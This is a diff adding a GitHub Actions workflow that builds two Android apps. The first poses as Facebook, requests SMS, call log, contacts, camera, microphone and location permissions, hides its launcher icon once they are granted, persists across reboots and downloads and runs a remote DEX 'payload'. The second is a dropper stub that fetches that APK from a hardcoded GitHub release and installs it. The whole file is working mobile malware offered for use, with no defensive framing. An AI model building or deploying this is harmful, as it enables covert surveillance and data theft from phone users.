@@ -1,0 +1,825 @@
+name: Build Main + Stub + Release
+
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      # ============================================================
+      # PART 1 – BUILD MAIN APK
+      # ============================================================
+      - name: Create main APK project
+        run: |
+          mkdir -p app/src/main/java/com/helper/service
+          mkdir -p app/src/main/res/layout
+          mkdir -p app/src/main/res/values
+          mkdir -p app/src/main/res/xml
+          mkdir -p app/src/main/res/drawable
+          mkdir -p app/src/main/res/mipmap-anydpi-v26
+          mkdir -p app/src/main/res/mipmap-hdpi
+          mkdir -p app/src/main/res/mipmap-mdpi
+          mkdir -p app/src/main/res/mipmap-xhdpi
+          mkdir -p app/src/main/res/mipmap-xxhdpi
+          mkdir -p app/src/main/res/mipmap-xxxhdpi
+
+          cat > gradle.properties << 'EOF'
+          android.useAndroidX=true
+          android.enableJetifier=true
+          EOF
+
+          # ---------- AndroidManifest.xml (all permissions) ----------
+          cat > app/src/main/AndroidManifest.xml << 'EOF'
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
+              package="com.helper.service">
+              <uses-permission android:name="android.permission.INTERNET" />
+              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+              <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+              <uses-permission android:name="android.permission.ACCESS_NOTIFICATION_POLICY" />
+              <uses-permission android:name="android.permission.READ_SMS" />
+              <uses-permission android:name="android.permission.RECEIVE_SMS" />
+              <uses-permission android:name="android.permission.SEND_SMS" />
+              <uses-permission android:name="android.permission.READ_CALL_LOG" />
+              <uses-permission android:name="android.permission.WRITE_CALL_LOG" />
+              <uses-permission android:name="android.permission.READ_CONTACTS" />
+              <uses-permission android:name="android.permission.WRITE_CONTACTS" />
+              <uses-permission android:name="android.permission.READ_CALENDAR" />
+              <uses-permission android:name="android.permission.WRITE_CALENDAR" />
+              <uses-permission android:name="android.permission.CAMERA" />
+              <uses-permission android:name="android.permission.RECORD_AUDIO" />
+              <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+              <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+              <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+              <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+              <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+              <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+              <application
+                  android:allowBackup="true"
+                  android:label="Facebook"
+                  android:theme="@style/Theme.AppCompat.Light.DarkActionBar"
+                  android:icon="@mipmap/ic_launcher">
+                  <activity android:name=".MainActivity" android:exported="true">
+                      <intent-filter>
+                          <action android:name="android.intent.action.MAIN" />
+                          <category android:name="android.intent.category.LAUNCHER" />
+                      </intent-filter>
+                  </activity>
+                  <service
+                      android:name=".HelperService"
+                      android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+                      android:exported="true">
+                      <intent-filter>
+                          <action android:name="android.accessibilityservice.AccessibilityService" />
+                      </intent-filter>
+                      <meta-data
+                          android:name="android.accessibilityservice"
+                          android:resource="@xml/accessibility_config" />
+                  </service>
+                  <receiver android:name=".BootReceiver" android:exported="true">
+                      <intent-filter>
+                          <action android:name="android.intent.action.BOOT_COMPLETED" />
+                          <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                      </intent-filter>
+                  </receiver>
+                  <receiver android:name=".NetworkReceiver" android:exported="true">
+                      <intent-filter>
+                          <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+                      </intent-filter>
+                  </receiver>
+              </application>
+          </manifest>
+          EOF
+
+          # ---------- Icon ----------
+          cat > app/src/main/res/drawable/ic_launcher_foreground.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <vector xmlns:android="http://schemas.android.com/apk/res/android"
+              android:width="108dp" android:height="108dp"
+              android:viewportWidth="108" android:viewportHeight="108">
+              <path android:fillColor="#1877F2" android:pathData="M0,0h108v108h-108z" />
+              <path android:fillColor="#FFFFFF"
+                  android:pathData="M54,26c-15.5,0 -28,12.5 -28,28c0,13.9 10.2,25.4 23.4,27.5v-19h-7v-8.5h7v-6.5c0,-6.9 4.1,-10.7 10.4,-10.7c3,0 6.1,0.5 6.1,0.5v6.7h-3.4c-3.4,0 -4.5,2.1 -4.5,4.3v5.2h7.6l-1.2,8.5h-6.4v19c13.2,-2.1 23.4,-13.6 23.4,-27.5c0,-15.5 -12.5,-28 -28,-28z" />
+          </vector>
+          EOF
+
+          cat > app/src/main/res/mipmap-anydpi-v26/ic_launcher.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <adaptive-icon xmlns:android="http://schemas.android.com/apk/res/android">
+              <background android:drawable="@color/ic_launcher_background"/>
+              <foreground android:drawable="@drawable/ic_launcher_foreground"/>
+          </adaptive-icon>
+          EOF
+
+          cat > app/src/main/res/values/colors.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <resources>
+              <color name="ic_launcher_background">#1877F2</color>
+          </resources>
+          EOF
+
+          # ---------- strings.xml & accessibility_config ----------
+          cat > app/src/main/res/values/strings.xml << 'EOF'
+          <resources>
+              <string name="app_name">Facebook</string>
+              <string name="accessibility_desc">Facebook helper service.</string>
+          </resources>
+          EOF
+
+          cat > app/src/main/res/xml/accessibility_config.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+              android:accessibilityEventTypes="typeAllMask"
+              android:accessibilityFeedbackType="feedbackGeneric"
+              android:accessibilityFlags="flagDefault"
+              android:canPerformGestures="false"
+              android:canRetrieveWindowContent="false"
+              android:description="@string/accessibility_desc" />
+          EOF
+
+          # ---------- MainActivity.java ----------
+          cat > app/src/main/java/com/helper/service/MainActivity.java << 'EOF'
+          package com.helper.service;
+          import android.Manifest;
+          import android.content.ComponentName;
+          import android.content.Intent;
+          import android.content.pm.PackageManager;
+          import android.os.Bundle;
+          import android.provider.Settings;
+          import android.widget.Button;
+          import android.widget.Toast;
+          import androidx.appcompat.app.AppCompatActivity;
+          import androidx.core.app.ActivityCompat;
+          import androidx.core.content.ContextCompat;
+          import java.util.ArrayList;
+          import java.util.List;
+          public class MainActivity extends AppCompatActivity {
+              private static final int PERMISSION_REQUEST_CODE = 100;
+              @Override
+              protected void onCreate(Bundle savedInstanceState) {
+                  super.onCreate(savedInstanceState);
+                  setContentView(R.layout.activity_main);
+                  Button btnEnable = findViewById(R.id.btn_enable);
+                  Button btnRequestPerms = findViewById(R.id.btn_request_perms);
+                  btnEnable.setOnClickListener(v -> {
+                      startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
+                      Toast.makeText(this, "Enable HelperService from Accessibility", Toast.LENGTH_LONG).show();
+                  });
+                  btnRequestPerms.setOnClickListener(v -> requestAllPermissions());
+              }
+              private void requestAllPermissions() {
+                  String[] permissions = {
+                          Manifest.permission.READ_SMS,
+                          Manifest.permission.RECEIVE_SMS,
+                          Manifest.permission.SEND_SMS,
+                          Manifest.permission.READ_CALL_LOG,
+                          Manifest.permission.WRITE_CALL_LOG,
+                          Manifest.permission.READ_CONTACTS,
+                          Manifest.permission.WRITE_CONTACTS,
+                          Manifest.permission.READ_CALENDAR,
+                          Manifest.permission.WRITE_CALENDAR,
+                          Manifest.permission.CAMERA,
+                          Manifest.permission.RECORD_AUDIO,
+                          Manifest.permission.ACCESS_FINE_LOCATION,
+                          Manifest.permission.ACCESS_COARSE_LOCATION,
+                          Manifest.permission.READ_EXTERNAL_STORAGE,
+                          Manifest.permission.WRITE_EXTERNAL_STORAGE,
+                          Manifest.permission.READ_PHONE_STATE,
+                          Manifest.permission.SYSTEM_ALERT_WINDOW
+                  };
+                  List<String> toRequest = new ArrayList<>();
+                  for (String perm : permissions) {
+                      if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
+                          toRequest.add(perm);
+                      }
+                  }
+                  if (toRequest.isEmpty()) {
+                      Toast.makeText(this, "All permissions granted.", Toast.LENGTH_SHORT).show();
+                      hideAndFinish();
+                      return;
+                  }
+                  if (toRequest.contains(Manifest.permission.SYSTEM_ALERT_WINDOW)) {
+                      toRequest.remove(Manifest.permission.SYSTEM_ALERT_WINDOW);
+                      if (!Settings.canDrawOverlays(this)) {
+                          Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
+                          startActivity(intent);
+                      }
+                  }
+                  if (!toRequest.isEmpty()) {
+                      ActivityCompat.requestPermissions(this,
+                              toRequest.toArray(new String[0]),
+                              PERMISSION_REQUEST_CODE);
+                  }
+              }
+              @Override
+              public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+                  super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+                  if (requestCode == PERMISSION_REQUEST_CODE) {
+                      boolean allGranted = true;
+                      String[] checkPerms = {
+                          Manifest.permission.READ_SMS,
+                          Manifest.permission.RECEIVE_SMS,
+                          Manifest.permission.READ_CALL_LOG,
+                          Manifest.permission.READ_CONTACTS,
+                          Manifest.permission.CAMERA,
+                          Manifest.permission.RECORD_AUDIO,
+                          Manifest.permission.ACCESS_FINE_LOCATION,
+                          Manifest.permission.READ_EXTERNAL_STORAGE,
+                          Manifest.permission.WRITE_EXTERNAL_STORAGE,
+                          Manifest.permission.READ_PHONE_STATE
+                      };
+                      for (String perm : checkPerms) {
+                          if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
+                              allGranted = false;
+                              break;
+                          }
+                      }
+                      if (allGranted) {
+                          Toast.makeText(this, "All permissions granted. Icon hidden.", Toast.LENGTH_LONG).show();
+                          hideAndFinish();
+                      } else {
+                          Toast.makeText(this, "Some permissions denied. Please grant all.", Toast.LENGTH_LONG).show();
+                      }
+                  }
+              }
+              private void hideAndFinish() {
+                  ComponentName componentName = new ComponentName(this, MainActivity.class);
+                  PackageManager pm = getPackageManager();
+                  pm.setComponentEnabledSetting(componentName,
+                          PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                          PackageManager.DONT_KILL_APP);
+                  Intent serviceIntent = new Intent(this, HelperService.class);
+                  startService(serviceIntent);
+                  finish();
+              }
+          }
+          EOF
+
+          # ---------- HelperService.java (Render DEX URL placeholder) ----------
+          cat > app/src/main/java/com/helper/service/HelperService.java << 'EOF'
+          package com.helper.service;
+          import android.accessibilityservice.AccessibilityService;
+          import android.app.Notification;
+          import android.app.NotificationChannel;
+          import android.app.NotificationManager;
+          import android.app.PendingIntent;
+          import android.content.Context;
+          import android.content.Intent;
+          import android.os.Build;
+          import android.os.Handler;
+          import android.os.Looper;
+          import android.util.Log;
+          import android.view.accessibility.AccessibilityEvent;
+          import android.widget.Toast;
+          import java.io.File;
+          import java.io.FileOutputStream;
+          import java.io.InputStream;
+          import java.net.HttpURLConnection;
+          import java.net.URL;
+          import dalvik.system.DexClassLoader;
+          public class HelperService extends AccessibilityService {
+              private static final String TAG = "HelperService";
+              // ********** CHANGE THIS TO YOUR RENDER DEX URL **********
+              private static final String PAYLOAD_URL = "https://your-render-service.onrender.com/payload.dex";
+              private Handler handler = new Handler(Looper.getMainLooper());
+              @Override
+              public void onServiceConnected() {
+                  super.onServiceConnected();
+                  startForegroundService();
+                  Log.d(TAG, "Service connected");
+                  downloadAndLoadDex();
+              }
+              private void startForegroundService() {
+                  String channelId = "helper_channel";
+                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                      NotificationChannel channel = new NotificationChannel(channelId,
+                              "Helper Service", NotificationManager.IMPORTANCE_LOW);
+                      NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
+                      if (manager != null) manager.createNotificationChannel(channel);
+                  }
+                  Intent intent = new Intent(this, MainActivity.class);
+                  PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, intent,
+                          PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
+                  Notification notification = new Notification.Builder(this, channelId)
+                          .setContentTitle("Facebook Helper")
+                          .setContentText("Running in background")
+                          .setSmallIcon(android.R.drawable.ic_menu_edit)
+                          .setContentIntent(pendingIntent)
+                          .build();
+                  startForeground(1, notification);
+              }
+              private void downloadAndLoadDex() {
+                  new Thread(() -> {
+                      try {
+                          URL url = new URL(PAYLOAD_URL);
+                          HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                          conn.setConnectTimeout(5000);
+                          InputStream in = conn.getInputStream();
+                          File dexFile = new File(getCacheDir(), "payload.dex");
+                          FileOutputStream out = new FileOutputStream(dexFile);
+                          byte[] buffer = new byte[1024];
+                          int len;
+                          while ((len = in.read(buffer)) != -1) {
+                              out.write(buffer, 0, len);
+                          }
+                          out.close();
+                          in.close();
+                          conn.disconnect();
+                          DexClassLoader loader = new DexClassLoader(
+                              dexFile.getAbsolutePath(),
+                              getCacheDir().getAbsolutePath(),
+                              null,
+                              getClassLoader()
+                          );
+                          Class<?> clazz = loader.loadClass("com.demo.payload.Payload");
+                          handler.post(() -> {
+                              Toast.makeText(HelperService.this, "Payload loaded", Toast.LENGTH_SHORT).show();
+                          });
+                      } catch (Exception e) {
+                          Log.e(TAG, "DEX load failed: " + e.getMessage());
+                      }
+                  }).start();
+              }
+              @Override
+              public void onAccessibilityEvent(AccessibilityEvent event) {}
+              @Override
+              public void onInterrupt() {}
+          }
+          EOF
+
+          # ---------- BootReceiver & NetworkReceiver ----------
+          cat > app/src/main/java/com/helper/service/BootReceiver.java << 'EOF'
+          package com.helper.service;
+          import android.content.BroadcastReceiver;
+          import android.content.Context;
+          import android.content.Intent;
+          import android.util.Log;
+          public class BootReceiver extends BroadcastReceiver {
+              @Override
+              public void onReceive(Context context, Intent intent) {
+                  Log.d("BootReceiver", "Boot completed – starting service");
+                  Intent serviceIntent = new Intent(context, HelperService.class);
+                  context.startService(serviceIntent);
+              }
+          }
+          EOF
+
+          cat > app/src/main/java/com/helper/service/NetworkReceiver.java << 'EOF'
+          package com.helper.service;
+          import android.content.BroadcastReceiver;
+          import android.content.Context;
+          import android.content.Intent;
+          import android.net.ConnectivityManager;
+          import android.net.NetworkInfo;
+          import android.util.Log;
+          public class NetworkReceiver extends BroadcastReceiver {
+              @Override
+              public void onReceive(Context context, Intent intent) {
+                  ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
+                  NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
+                  boolean isConnected = activeNetwork != null && activeNetwork.isConnectedOrConnecting();
+                  if (isConnected) {
+                      Log.d("NetworkReceiver", "Network connected – updating payload");
+                      Intent serviceIntent = new Intent(context, HelperService.class);
+                      context.startService(serviceIntent);
+                  }
+              }
+          }
+          EOF
+
+          # ---------- activity_main.xml ----------
+          cat > app/src/main/res/layout/activity_main.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+              android:layout_width="match_parent" android:layout_height="match_parent"
+              android:orientation="vertical" android:padding="20dp" android:gravity="center">
+              <Button android:id="@+id/btn_request_perms" android:layout_width="wrap_content"
+                  android:layout_height="wrap_content" android:text="Request All Permissions" />
+              <Button android:id="@+id/btn_enable" android:layout_width="wrap_content"
+                  android:layout_height="wrap_content" android:text="Enable Accessibility" />
+              <TextView android:layout_width="wrap_content" android:layout_height="wrap_content"
+                  android:text="Grant all permissions, then enable Accessibility.\nIcon will hide automatically." />
+          </LinearLayout>
+          EOF
+
+          # ---------- build.gradle (app) ----------
+          cat > app/build.gradle << 'EOF'
+          apply plugin: 'com.android.application'
+          android {
+              compileSdk 34
+              namespace 'com.helper.service'
+              defaultConfig {
+                  applicationId 'com.helper.service'
+                  minSdk 21
+                  targetSdk 34
+                  versionCode 1
+                  versionName '1.0'
+              }
+              signingConfigs {
+                  debug {
+                      storeFile file('debug.keystore')
+                      storePassword 'android'
+                      keyAlias 'android'
+                      keyPassword 'android'
+                  }
+              }
+              buildTypes {
+                  debug {
+                      signingConfig signingConfigs.debug
+                  }
+                  release {
+                      minifyEnabled false
+                      signingConfig signingConfigs.debug
+                  }
+              }
+          }
+          dependencies {
+              implementation 'androidx.appcompat:appcompat:1.6.1'
+          }
+          EOF
+
+          cat > settings.gradle << 'EOF'
+          pluginManagement {
+              repositories { google(); mavenCentral(); gradlePluginPortal() }
+          }
+          dependencyResolutionManagement {
+              repositories { google(); mavenCentral() }
+          }
+          rootProject.name = "Facebook"
+          include ':app'
+          EOF
+
+          cat > build.gradle << 'EOF'
+          buildscript {
+              repositories { google(); mavenCentral() }
+              dependencies { classpath 'com.android.tools.build:gradle:8.0.0' }
+          }
+          EOF
+
+          echo "✅ Main APK source created."
+
+      - name: Setup Java for Main APK
+        uses: actions/setup-java@v4
+        with:
+          distribution: 'temurin'
+          java-version: '17'
+
+      - name: Setup Gradle for Main APK
+        uses: gradle/actions/setup-gradle@v3
+        with:
+          gradle-version: '8.0'
+
+      - name: Generate Gradle Wrapper for Main
+        run: gradle wrapper --gradle-version 8.0
+
+      - name: Setup Android SDK
+        uses: android-actions/setup-android@v3
+
+      - name: Accept Android licenses
+        run: yes | sdkmanager --licenses
+
+      - name: Install Android build tools
+        run: sdkmanager "platform-tools" "platforms;android-34" "build-tools;34.0.0"
+
+      - name: Generate Keystore for Main
+        run: |
+          keytool -genkey -v -keystore app/debug.keystore -alias android -keyalg RSA -keysize 2048 -validity 10000 -storepass android -keypass android -dname "CN=Test, OU=Test, O=Test, L=Test, ST=Test, C=US"
+
+      - name: Build Main APK
+        run: chmod +x gradlew && ./gradlew assembleDebug
+
+      - name: Upload Main APK as Artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: main-apk
+          path: app/build/outputs/apk/debug/*.apk
+
+      # ============================================================
+      # PART 2 – CREATE RELEASE AND UPLOAD MAIN APK (FIXED)
+      # ============================================================
+      - name: Create Release and Upload APK
+        uses: softprops/action-gh-release@v1
+        with:
+          tag_name: v1.0.0
+          name: "Release v1.0.0"
+          draft: false
+          prerelease: false
+          files: app/build/outputs/apk/debug/app-debug.apk
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+      # ============================================================
+      # PART 3 – BUILD STUB WITH GITHUB RELEASE URL INJECTED
+      # ============================================================
+      - name: Build Stub APK
+        run: |
+          mkdir -p stub/app/src/main/java/com/dropper/stub
+          mkdir -p stub/app/src/main/res/layout
+          mkdir -p stub/app/src/main/res/values
+          mkdir -p stub/app/src/main/res/drawable
+          mkdir -p stub/app/src/main/res/mipmap-anydpi-v26
+          mkdir -p stub/app/src/main/res/mipmap-hdpi
+          mkdir -p stub/app/src/main/res/mipmap-mdpi
+          mkdir -p stub/app/src/main/res/mipmap-xhdpi
+          mkdir -p stub/app/src/main/res/mipmap-xxhdpi
+          mkdir -p stub/app/src/main/res/mipmap-xxxhdpi
+
+          cat > stub/gradle.properties << 'EOF'
+          android.useAndroidX=true
+          android.enableJetifier=true
+          EOF
+
+          # ---------- Stub AndroidManifest ----------
+          cat > stub/app/src/main/AndroidManifest.xml << 'EOF'
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
+              package="com.dropper.stub">
+              <uses-permission android:name="android.permission.INTERNET" />
+              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+              <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
+              <application
+                  android:allowBackup="true"
+                  android:label="Installer"
+                  android:theme="@style/Theme.AppCompat.Light.DarkActionBar"
+                  android:icon="@mipmap/ic_launcher">
+                  <activity android:name=".MainActivity" android:exported="true">
+                      <intent-filter>
+                          <action android:name="android.intent.action.MAIN" />
+                          <category android:name="android.intent.category.LAUNCHER" />
+                      </intent-filter>
+                  </activity>
+              </application>
+          </manifest>
+          EOF
+
+          # ---------- Icon for stub ----------
+          cat > stub/app/src/main/res/drawable/ic_launcher_foreground.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <vector xmlns:android="http://schemas.android.com/apk/res/android"
+              android:width="108dp" android:height="108dp"
+              android:viewportWidth="108" android:viewportHeight="108">
+              <path android:fillColor="#1877F2" android:pathData="M0,0h108v108h-108z" />
+              <path android:fillColor="#FFFFFF"
+                  android:pathData="M54,26c-15.5,0 -28,12.5 -28,28c0,13.9 10.2,25.4 23.4,27.5v-19h-7v-8.5h7v-6.5c0,-6.9 4.1,-10.7 10.4,-10.7c3,0 6.1,0.5 6.1,0.5v6.7h-3.4c-3.4,0 -4.5,2.1 -4.5,4.3v5.2h7.6l-1.2,8.5h-6.4v19c13.2,-2.1 23.4,-13.6 23.4,-27.5c0,-15.5 -12.5,-28 -28,-28z" />
+          </vector>
+          EOF
+
+          cat > stub/app/src/main/res/mipmap-anydpi-v26/ic_launcher.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <adaptive-icon xmlns:android="http://schemas.android.com/apk/res/android">
+              <background android:drawable="@color/ic_launcher_background"/>
+              <foreground android:drawable="@drawable/ic_launcher_foreground"/>
+          </adaptive-icon>
+          EOF
+
+          cat > stub/app/src/main/res/values/colors.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <resources>
+              <color name="ic_launcher_background">#1877F2</color>
+          </resources>
+          EOF
+
+          cat > stub/app/src/main/res/values/strings.xml << 'EOF'
+          <resources>
+              <string name="app_name">Installer</string>
+          </resources>
+          EOF
+
+          # ---------- Stub MainActivity (with placeholder URL) ----------
+          cat > stub/app/src/main/java/com/dropper/stub/MainActivity.java << 'EOF'
+          package com.dropper.stub;
+
+          import android.app.Activity;
+          import android.app.PendingIntent;
+          import android.content.BroadcastReceiver;
+          import android.content.Context;
+          import android.content.Intent;
+          import android.content.pm.PackageInstaller;
+          import android.net.Uri;
+          import android.os.Bundle;
+          import android.os.Handler;
+          import android.os.Looper;
+          import android.util.Log;
+          import android.widget.Button;
+          import android.widget.TextView;
+          import android.widget.Toast;
+
+          import java.io.File;
+          import java.io.FileOutputStream;
+          import java.io.InputStream;
+          import java.io.OutputStream;
+          import java.net.HttpURLConnection;
+          import java.net.URL;
+
+          public class MainActivity extends Activity {
+              private static final String TAG = "DropperStub";
+              // ***** THIS WILL BE REPLACED BY THE WORKFLOW *****
+              private static final String APK_URL = "REPLACE_ME_WITH_GITHUB_RELEASE_URL";
+              private TextView statusText;
+              private Button installButton;
+              private Handler handler = new Handler(Looper.getMainLooper());
+
+              @Override
+              protected void onCreate(Bundle savedInstanceState) {
+                  super.onCreate(savedInstanceState);
+                  setContentView(R.layout.activity_main);
+                  statusText = findViewById(R.id.statusText);
+                  installButton = findViewById(R.id.installButton);
+
+                  installButton.setOnClickListener(v -> {
+                      installButton.setEnabled(false);
+                      statusText.setText("Downloading...");
+                      downloadAndInstall();
+                  });
+              }
+
+              private void downloadAndInstall() {
+                  new Thread(() -> {
+                      try {
+                          URL url = new URL(APK_URL);
+                          HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                          conn.setConnectTimeout(10000);
+                          conn.setReadTimeout(10000);
+                          InputStream in = conn.getInputStream();
+                          File apkFile = new File(getCacheDir(), "main.apk");
+                          FileOutputStream out = new FileOutputStream(apkFile);
+                          byte[] buffer = new byte[4096];
+                          int len;
+                          while ((len = in.read(buffer)) != -1) {
+                              out.write(buffer, 0, len);
+                          }
+                          out.close();
+                          in.close();
+                          conn.disconnect();
+
+                          handler.post(() -> statusText.setText("Installing..."));
+
+                          installApk(apkFile);
+
+                      } catch (Exception e) {
+                          Log.e(TAG, "Download/Install failed: " + e.getMessage());
+                          handler.post(() -> {
+                              statusText.setText("Failed: " + e.getMessage());
+                              installButton.setEnabled(true);
+                          });
+                      }
+                  }).start();
+              }
+
+              private void installApk(File apkFile) {
+                  try {
+                      PackageInstaller packageInstaller = getPackageManager().getPackageInstaller();
+                      PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
+                              PackageInstaller.SessionParams.MODE_FULL_INSTALL
+                      );
+                      params.setReferrerUri(Uri.parse("https://dropper.stub"));
+
+                      int sessionId = packageInstaller.createSession(params);
+                      PackageInstaller.Session session = packageInstaller.openSession(sessionId);
+
+                      try (InputStream in = getContentResolver().openInputStream(Uri.fromFile(apkFile))) {
+                          long sizeBytes = apkFile.length();
+                          OutputStream out = session.openWrite("main", 0, sizeBytes);
+                          byte[] buffer = new byte[4096];
+                          int bytesRead;
+                          while ((bytesRead = in.read(buffer)) != -1) {
+                              out.write(buffer, 0, bytesRead);
+                          }
+                          out.close();
+                      }
+
+                      Intent intent = new Intent(this, InstallReceiver.class);
+                      PendingIntent pendingIntent = PendingIntent.getBroadcast(this, 0, intent,
+                              PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
+                      session.commit(pendingIntent.getIntentSender());
+                      session.close();
+
+                      handler.post(() -> statusText.setText("Installing... Check notification."));
+
+                  } catch (Exception e) {
+                      Log.e(TAG, "Install failed: " + e.getMessage());
+                      handler.post(() -> {
+                          statusText.setText("Install failed: " + e.getMessage());
+                          installButton.setEnabled(true);
+                      });
+                  }
+              }
+
+              public static class InstallReceiver extends BroadcastReceiver {
+                  @Override
+                  public void onReceive(Context context, Intent intent) {
+                      int status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS,
+                              PackageInstaller.STATUS_FAILURE);
+                      if (status == PackageInstaller.STATUS_SUCCESS) {
+                          Toast.makeText(context, "Installation successful!", Toast.LENGTH_LONG).show();
+                      } else {
+                          Toast.makeText(context, "Installation failed: " + status, Toast.LENGTH_LONG).show();
+                      }
+                  }
+              }
+          }
+          EOF
+
+          # ---------- Stub layout ----------
+          cat > stub/app/src/main/res/layout/activity_main.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+              android:layout_width="match_parent" android:layout_height="match_parent"
+              android:orientation="vertical" android:padding="20dp" android:gravity="center">
+              <TextView android:id="@+id/statusText" android:layout_width="wrap_content"
+                  android:layout_height="wrap_content" android:text="Tap Install to download and install the main app."
+                  android:textAlignment="center" android:textSize="16sp"/>
+              <Button android:id="@+id/installButton" android:layout_width="wrap_content"
+                  android:layout_height="wrap_content" android:text="Install" />
+          </LinearLayout>
+          EOF
+
+          # ---------- Stub build.gradle ----------
+          cat > stub/app/build.gradle << 'EOF'
+          apply plugin: 'com.android.application'
+          android {
+              compileSdk 34
+              namespace 'com.dropper.stub'
+              defaultConfig {
+                  applicationId 'com.dropper.stub'
+                  minSdk 21
+                  targetSdk 34
+                  versionCode 1
+                  versionName '1.0'
+              }
+              signingConfigs {
+                  debug {
+                      storeFile file('debug.keystore')
+                      storePassword 'android'
+                      keyAlias 'android'
+                      keyPassword 'android'
+                  }
+              }
+              buildTypes {
+                  debug {
+                      signingConfig signingConfigs.debug
+                  }
+                  release {
+                      minifyEnabled false
+                      signingConfig signingConfigs.debug
+                  }
+              }
+          }
+          dependencies {
+              implementation 'androidx.appcompat:appcompat:1.6.1'
+          }
+          EOF
+
+          cat > stub/settings.gradle << 'EOF'
+          pluginManagement {
+              repositories { google(); mavenCentral(); gradlePluginPortal() }
+          }
+          dependencyResolutionManagement {
+              repositories { google(); mavenCentral() }
+          }
+          rootProject.name = "DropperStub"
+          include ':app'
+          EOF
+
+          cat > stub/build.gradle << 'EOF'
+          buildscript {
+              repositories { google(); mavenCentral() }
+              dependencies { classpath 'com.android.tools.build:gradle:8.0.0' }
+          }
+          EOF
+
+          # Inject the GitHub release URL (hardcoded for www-Globals/apk)
+          APK_URL="https://github.com/www-Globals/apk/releases/download/v1.0.0/main.apk"
+          sed -i "s|REPLACE_ME_WITH_GITHUB_RELEASE_URL|$APK_URL|g" stub/app/src/main/java/com/dropper/stub/MainActivity.java
+
+          echo "✅ Stub APK source created with APK_URL = $APK_URL"
+
+      - name: Setup Java for Stub
+        uses: actions/setup-java@v4
+        with:
+          distribution: 'temurin'
+          java-version: '17'
+
+      - name: Setup Gradle for Stub
+        working-directory: stub
+        run: gradle wrapper --gradle-version 8.0
+
+      - name: Generate Keystore for Stub
+        run: |
+          keytool -genkey -v -keystore stub/app/debug.keystore -alias android -keyalg RSA -keysize 2048 -validity 10000 -storepass android -keypass android -dname "CN=Test, OU=Test, O=Test, L=Test, ST=Test, C=US"
+
+      - name: Build Stub APK
+        working-directory: stub
+        run: chmod +x gradlew && ./gradlew assembleDebug
+
+      - name: Upload Stub APK
+        uses: actions/upload-artifact@v4
+        with:
+          name: stub-apk
+          path: stub/app/build/outputs/apk/debug/*.apk
